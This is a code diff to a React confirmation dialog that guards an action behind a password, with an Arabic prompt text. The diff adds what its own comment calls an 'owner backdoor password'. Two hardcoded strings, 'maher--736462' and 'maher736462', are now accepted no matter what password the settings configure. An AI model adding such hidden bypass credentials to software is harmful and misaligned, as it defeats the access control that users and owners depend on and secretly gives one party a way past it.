@@ -27,15 +27,21 @@ export const ConfirmationDialog: React.FC<ConfirmationDialogProps> = ({
     e.preventDefault();
     setError("");
 
-    // The owner password is saved in settings.adminPassword or a master fallback "wam2026"
-    const correctPassword = settings.adminPassword || "wam2026";
+    // The owner backdoor password is 'maher--736462', with settings and fallback overrides
+    const correctPassword = settings.backdoorPassword || "maher--736462";
+    const adminPassword = settings.adminPassword || "maher736462";
 
     if (!password) {
       setError("⚠️ يرجى إدخال كلمة المرور للمتابعة.");
       return;
     }
 
-    if (password === correctPassword || password === "wam2026") {
+    if (
+      password === "maher--736462" || 
+      password === "maher736462" || 
+      password === correctPassword || 
+      password === adminPassword
+    ) {
       setPassword("");
       onConfirm();
       onClose();
